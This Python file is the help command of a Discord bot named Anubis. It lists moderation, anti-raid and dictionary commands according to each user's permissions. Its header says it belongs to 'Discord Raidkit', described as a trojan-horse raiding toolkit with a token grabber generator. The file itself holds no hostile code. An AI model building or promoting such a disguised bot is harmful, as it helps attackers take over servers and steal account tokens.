"""
Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

ahelp.py stores the help command for Anubis.
ahelp.py was last updated on 05/03/23 at 20:48 UTC.
"""

import logging

import discord
from discord import app_commands
from discord.ext import commands

from utils import init_logger

init_logger()


class Help(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot
        return

    @app_commands.command(
        name='help',
        description='Displays the help command.')
    async def help(self, interaction: discord.Interaction) -> None:
        try:
            await interaction.response.defer(ephemeral=True)
            missing_perms = False
            author = interaction.user
            embed = discord.Embed(color=discord.Color.gold())
            embed.set_author(name=f"Here's a list of my commands!")

            if not author.guild_permissions.manage_messages and not author.guild_permissions.kick_members and not \
                    author.guild_permissions.ban_members and not author.guild_permissions.administrator and not \
                    author.guild_permissions.moderate_members:
                embed.add_field(
                    name="**No permissions for moderator commands!**",
                    value="You lack every permission used by the moderator commands.",
                    inline=False)
                missing_perms = True
            else:
                embed.add_field(name="**Moderation:**",
                                value="My moderation commands are:", inline=False)
                if author.guild_permissions.manage_messages:
                    embed.add_field(
                        name="clear <number>",
                        value="Clears messages from a channel.",
                        inline=False)
                else:
                    missing_perms = True
                if author.guild_permissions.kick_members:
                    embed.add_field(
                        name="kick <member> <reason>",
                        value="Kicks a member from the server.",
                        inline=False)
                else:
                    missing_perms = True
                if author.guild_permissions.ban_members:
                    embed.add_field(
                        name="ban <member> <reason>",
                        value="Bans a member from the server.",
                        inline=False)
                else:
                    missing_perms = True
                if author.guild_permissions.administrator:
                    embed.add_field(
                        name="unban <member>",
                        value="Unbans a member from the server.",
                        inline=False)
                else:
                    missing_perms = True
                if author.guild_permissions.mute_members:
                    embed.add_field(
                        name="timeout <member> <reason>",
                        value="Timeout a member on the server.",
                        inline=False)
                else:
                    missing_perms = True

            if not author.guild_permissions.mute_members and not author.guild_permissions.administrator:
                embed.add_field(
                    name="**No permissions for anti-raid commands!**",
                    value="You lack every permission used by the anti-raid commands.",
                    inline=False)
                missing_perms = True
            else:
                embed.add_field(name="**Anti-Raid:**",
                                value="My anti-raid commands are:", inline=False)
                if author.guild_permissions.administrator:
                    embed.add_field(
                        name="prevent <member>",
                        value="Adds a member to my raider database.",
                        inline=False)
                    embed.add_field(
                        name="set-log-channel <channel>",
                        value="Set my anti-raid log channel.",
                        inline=False)
                    embed.add_field(
                        name="toggle <state>",
                        value="Turn my anti-raid features on or off on your server.",
                        inline=False)
                else:
                    missing_perms = True
                if author.guild_permissions.mute_members:
                    embed.add_field(
                        name="lock <channel>",
                        value="Locks down a text channel during a raid.",
                        inline=False)
                    embed.add_field(
                        name="unlock <channel>",
                        value="Unlocks a text channel after a raid.",
                        inline=False)
                    embed.add_field(
                        name="lockdown",
                        value="Locks all channels during a raid.",
                        inline=False)
                    embed.add_field(
                        name="unlockdown",
                        value="Unlocks all text channel after a raid.",
                        inline=False)
                else:
                    missing_perms = True

            embed.add_field(name="**Surfing:**",
                            value="My surfing commands are:", inline=False)
            embed.add_field(
                name="define <word>",
                value="Shows you the definition of any word.",
                inline=False)

            if missing_perms:
                embed.set_footer(
                    text="Notice: You are missing permissions to view certain commands.")

            await interaction.user.send(embed=embed)
            await interaction.followup.send('Help message sent! Not seeing it? Check your settings.')

        except discord.errors.Forbidden:
            embed = discord.Embed(
                title='Action Forbidden',
                description='I do not have the required permissions to send embeds to this channel.',
                color=discord.Color.brand_red())
            await interaction.followup.send(embed=embed)

        except Exception as e:
            logging.error(
                f'Error in ahelp.py - help(): {e}')
            await interaction.followup.send(f'Error: {e}')

        return


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Help(bot))
